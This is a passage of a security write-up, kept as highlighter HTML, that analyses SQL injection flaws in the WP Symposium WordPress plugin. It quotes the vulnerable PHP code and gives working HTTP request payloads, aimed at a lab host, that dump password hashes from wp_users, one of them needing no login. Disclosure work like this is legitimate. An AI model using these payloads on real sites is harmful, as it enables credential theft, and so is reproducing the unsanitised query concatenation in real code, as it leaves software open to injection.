class="crayon-line" id="crayon-53c987717c908898597371-246"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0079 seconds] -->
<p>Because it uses multiple line, we have to do a bit more work than the other ones. We can craft an union select which fits in and uses the rest of the query without a problem like this, and dump a list of usernames and password hashes:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c919703536965" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_groups_functions.php HTTP/1.0
Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 130

action=get_user_list&amp;gid=353234) AND 1=2 UNION SELECT user_pass, 2, 3, 4, 5, 6, 7, 8, 9, display_name, 11 FROM wp_users WHERE (1=1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c919703536965-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c919703536965-2">2</div><div class="crayon-num" data-line="crayon-53c987717c919703536965-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c919703536965-4">4</div><div class="crayon-num" data-line="crayon-53c987717c919703536965-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c919703536965-6">6</div><div class="crayon-num" data-line="crayon-53c987717c919703536965-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c919703536965-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c919703536965-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_groups_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c919703536965-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987717c919703536965-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c919703536965-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987717c919703536965-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c919703536965-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">130</span></div><div class="crayon-line" id="crayon-53c987717c919703536965-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c919703536965-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">get_user_list</span><span class="crayon-o">&amp;</span><span class="crayon-v">gid</span><span class="crayon-o">=</span><span class="crayon-cn">353234</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-i">user_pass</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">9</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">display_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-h"> </span><span class="crayon-e">FROM </span><span class="crayon-e">wp_users </span><span class="crayon-i">WHERE</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0054 seconds] -->
<p><strong>Analysis of get_album_item.php SQL injection vulnerability</strong></p>
<p>This SQL injection vulnerability is practically as simple as it gets. And it even makes it simple for us in <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/get_album_item.php">get_album_item.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c923248087589" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?php
	include_once('../../../wp-config.php');
	global $wpdb;
	$iid = $_REQUEST['iid'];
	$size = $_REQUEST['size'];
	$sql = "SELECT ".$size." FROM ".$wpdb-&gt;base_prefix."symposium_gallery_items WHERE iid = %d";
	$image = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $iid));	
	header("Content-type: image/jpeg");
	echo stripslashes($image);
?&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c923248087589-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c923248087589-2">2</div><div class="crayon-num" data-line="crayon-53c987717c923248087589-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c923248087589-4">4</div><div class="crayon-num" data-line="crayon-53c987717c923248087589-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c923248087589-6">6</div><div class="crayon-num" data-line="crayon-53c987717c923248087589-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c923248087589-8">8</div><div class="crayon-num" data-line="crayon-53c987717c923248087589-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c923248087589-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c923248087589-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c923248087589-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">include_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../wp-config.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c923248087589-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c923248087589-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$iid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'iid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c923248087589-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$size</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'size'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c923248087589-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT "</span><span class="crayon-sy">.</span><span class="crayon-v">$size</span><span class="crayon-sy">.</span><span class="crayon-s">" FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_gallery_items WHERE iid = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c923248087589-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$image</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$iid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c923248087589-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-type: image/jpeg"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c923248087589-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-v">$image</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c923248087589-10"><span class="crayon-ta">?&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0039 seconds] -->
<p>It reads in 2 variables from $_REQUEST, which can be either GET or POST parameters. That&#8217;s very handy. It then proceeds to stuff the size into the SELECT part of the query using plain concatenation without previous sanitization, and then uses the wordpress prepare method of passing in content to a query safely using a printf syntax, which is safe.</p>
<p>Because we have control over the SELECT part of the query, we can easily select out a single piece of data at a time, which is sufficient to dump the whole database as needed. Here we can pull out a password from the users table, for instance, using a very simple request, no authentication required:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c92d142829389" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/get_album_item.php HTTP/1.0
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

size=user_pass FROM wp_users #</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c92d142829389-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c92d142829389-2">2</div><div class="crayon-num" data-line="crayon-53c987717c92d142829389-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c92d142829389-4">4</div><div class="crayon-num" data-line="crayon-53c987717c92d142829389-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c92d142829389-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c92d142829389-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-v">get_album_item</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c92d142829389-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987717c92d142829389-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c92d142829389-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">30</span></div><div class="crayon-line" id="crayon-53c987717c92d142829389-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c92d142829389-6"><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-e">user_pass </span><span class="crayon-e">FROM </span><span class="crayon-i">wp_users</span><span class="crayon-h"> </span><span class="crayon-p">#</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p><strong>Analysis of symposium_show_profile SQL injection vulnerability</strong></p>
<p>This vulnerability relies on the way which profiles are shown in Symposium. It calls into the symposium_show_profile method in symposium_profile.php file, which finds out what ID to show information for like this, assuming you are authenticated:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c936567816030" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Adds profile page
function symposium_show_profile($page)  
{  

	global $wpdb, $current_user;

	$uid = '';

	if (isset($_POST['from']) &amp;amp;&amp;amp; $_POST['from'] == 'small_search') {
		if ($_POST['uid'] == '') {
			$search = $_POST['member_small'];
			$uid = $wpdb-&amp;gt;get_var("SELECT u.ID FROM ".$wpdb-&amp;gt;base_prefix."users u WHERE u.display_name LIKE '".$search."%'");
		}
	} 
	if ($uid == '') {

		if (isset($_GET['uid'])) {
			$uid = $_GET['uid'];
		} else {
			if (isset($_POST['uid'])) {
				$uid = $_POST['uid'];
			} else {
				$uid = $current_user-&amp;gt;ID;
			}
		}

	}

	// resolve stubs if using WPS permalinks
	if ( get_option('symposium_permalink_structure') &amp;amp;&amp;amp; get_query_var('stub')) {
		$stubs = explode('/', get_query_var('stub'));
		$stub0 = $stubs[0];
		if (WPS_DEBUG) echo $stub0.'&amp;lt;br /&amp;gt;';

		if ($stub0) {
			$sql = "SELECT ID FROM ".$wpdb-&amp;gt;base_prefix."users WHERE replace(display_name, ' ', '') = %s";
			$id = $wpdb-&amp;gt;get_var($wpdb-&amp;gt;prepare($sql, $stub0));
			if (WPS_DEBUG) echo $wpdb-&amp;gt;last_query.'&amp;lt;br /&amp;gt;';
			if ($id) {
				$uid = $id;
			}
		}
	}

	$share = get_symposium_meta($uid, 'share');
	if (WPS_DEBUG) echo 'UID:'.$uid.'&amp;lt;br /&amp;gt;';
	$html = '&amp;lt;div id="symposium_current_user_page" style="display:none"&amp;gt;'.$uid.'&amp;lt;/div&amp;gt;';

	if (is_user_logged_in() || $share == 'public') {		

		$user = $wpdb-&amp;gt;get_row("SELECT display_name FROM ".$wpdb-&amp;gt;base_prefix."users WHERE ID = ".$uid);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c936567816030-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-2">2</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-4">4</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-6">6</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-8">8</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-10">10</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-12">12</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-14">14</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-16">16</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-18">18</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-20">20</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-22">22</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-24">24</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-26">26</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-28">28</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-30">30</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-32">32</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-34">34</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-36">36</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-38">38</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-40">40</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-42">42</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-44">44</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-46">46</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-48">48</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c936567816030-50">50</div><div class="crayon-num" data-line="crayon-53c987717c936567816030-51">51</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c936567816030-1"><span class="crayon-c">// Adds profile page</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">symposium_show_profile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">page</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-3"><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-4">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-6">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-8">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'from'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'from'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'small_search'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" 